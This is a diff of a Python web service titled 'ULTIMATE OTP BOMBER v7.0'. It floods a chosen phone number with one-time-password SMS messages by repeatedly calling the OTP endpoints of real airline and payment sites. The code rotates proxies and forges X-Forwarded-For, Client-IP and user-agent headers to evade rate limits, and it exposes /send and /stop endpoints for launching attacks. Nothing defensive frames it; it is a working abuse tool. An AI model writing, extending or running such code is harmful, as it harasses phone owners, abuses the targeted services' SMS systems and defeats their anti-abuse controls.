-    ("spicejet_sms", "https://www.spicejet.com", "/api/v1/otp", "mobile"),
-    ("akasa_sms", "https://www.akasaair.com", "/api/v1/otp", "mobile"),
-    ("vistara_sms", "https://www.airvistara.com", "/api/v1/otp", "mobile"),
-    ("gofirst_sms", "https://www.flygofirst.com", "/api/v1/otp", "mobile"),
-    ("olamoney_sms", "https://www.olamoney.com", "/api/v1/otp", "mobile"),
-]
-
-for brand_name, base, path, key in BULK_BRANDS:
-    ULTIMATE_APIS.append({
-        "name": brand_name,
-        "url": base + path,
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p, k=key: f'{{"{k}":"{p}"}}',
-    })
 
 print(f"✅ Loaded {len(ULTIMATE_APIS)} APIs")
 
 
 # ═══════════════════════════════════════════════════════════
-# 💣 FIRE ONE — with proxy rotation
+# 💣 FIRE ONE — with proxy + device spoofing
 # ═══════════════════════════════════════════════════════════
 async def fire_one(session, api, phone, stats, proxy_url, session_id):
     try:
         headers = dict(api["headers"])
-        # Fake device IP + UA
         headers["X-Forwarded-For"] = fake_ip()
         headers["Client-IP"] = fake_ip()
-        headers["User-Agent"] = fake_ua()
+        # Only override UA if not explicitly set to a specific UA
+        if headers.get("User-Agent") in (None, "Mozilla/5.0"):
+            headers["User-Agent"] = fake_ua()
         headers["X-Session-Id"] = session_id
-        headers["Cache-Control"] = "no-cache"
 
         url = api["url"](phone) if callable(api["url"]) else api["url"]
         data = api["data"](phone) if api.get("data") else None
@@ -626,7 +519,6 @@ async def fire_one(session, api, phone, stats, proxy_url, session_id):
 async def bomb_worker(job_id: str, phone: str, count: int):
     _stop_numbers.discard(phone)
 
-    # Refresh proxy pool first
     await refresh_proxies(force=True)
     if not _proxy_pool:
         print(f"[{job_id}] ⚠️ No proxies available — running direct")
@@ -657,7 +549,6 @@ async def bomb_worker(job_id: str, phone: str, count: int):
                     print(f"[{job_id}] 🛑 Stopped at cycle {cycle+1}")
                     break
 
-                # Build task batches — each API gets a random proxy + session
                 tasks = []
                 for api in ULTIMATE_APIS:
                     # Every 10-20 devices → new proxy (session rotation)
@@ -667,7 +558,7 @@ async def bomb_worker(job_id: str, phone: str, count: int):
 
                     tasks.append(fire_one(session, api, phone, stats, proxy_url, session_id))
 
-                # Execute in chunks to avoid overload
+                # Execute in chunks
                 for i in range(0, len(tasks), BATCH_CHUNK):
                     chunk = tasks[i:i + BATCH_CHUNK]
                     await asyncio.gather(*chunk, return_exceptions=True)
@@ -678,7 +569,6 @@ async def bomb_worker(job_id: str, phone: str, count: int):
                       f"Total={stats['total']} | HTTP_OK={stats['http_ok']} | "
                       f"OTP={stats['otp_ok']} | {rps:.1f}/s")
 
-                # Refresh proxies every 5 minutes
                 if time.time() - _proxy_last_fetch > PROXY_REFRESH_INTERVAL:
                     await refresh_proxies(force=True)
 
@@ -697,13 +587,13 @@ async def bomb_worker(job_id: str, phone: str, count: int):
 @app.get("/", response_class=HTMLResponse)
 async def root():
     return f"""
-    <html><head><title>ULTIMATE OTP BOMBER v6.0</title></head>
+    <html><head><title>ULTIMATE OTP BOMBER v7.0</title></head>
     <body style="font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px">
-    <h1>🔥 ULTIMATE OTP BOMBER v6.0</h1>
+    <h1>🔥 ULTIMATE OTP BOMBER v7.0</h1>
     <p>APIs: <b>{len(ULTIMATE_APIS)}</b> | Workers: <b>{MAX_CONCURRENT}</b> | Proxies: <b>{len(_proxy_pool)}</b></p>
     <ul>
       <li><a href="/health" style="color:#0ff">/health</a></li>
-      <li><a href="/proxies" style="color:#0ff">/proxies</a></li>
+      <li><a href="/proxies?refresh=1" style="color:#0ff">/proxies?refresh=1</a></li>
       <li><a href="/send?number=9876543210&count=10" style="color:#0ff">/send?number=9876543210&count=10</a></li>
       <li><a href="/stop?number=9876543210" style="color:#0ff">/stop?number=9876543210</a></li>
       <li><a href="/stats?number=9876543210" style="color:#0ff">/stats?number=9876543210</a></li>
@@ -732,11 +622,6 @@ async def list_proxies(refresh: int = 0):
         "last_fetch": datetime.fromtimestamp(_proxy_last_fetch).isoformat() if _proxy_last_fetch else None,
         "proxies": _proxy_pool[:100],
     }
-
-
-@app.get("/apis")
-async def list_apis():
-    return {"total": len(ULTIMATE_APIS), "apis": [a["name"] for a in ULTIMATE_APIS]}
 
 
 @app.get("/send")
@@ -800,7 +685,7 @@ async def stats_endpoint(number: str = Query(...)):
 if __name__ == "__main__":
     print(f"""
 ╔══════════════════════════════════════════════════════════╗
-║   🔥 ULTIMATE OTP BOMBER API v6.0                       ║
+║   🔥 ULTIMATE OTP BOMBER API v7.0                       ║
 ║   ▸ APIs     : {len(ULTIMATE_APIS)}
 ║   ▸ Workers  : {MAX_CONCURRENT}
 ║   ▸ Proxies  : auto-fetch
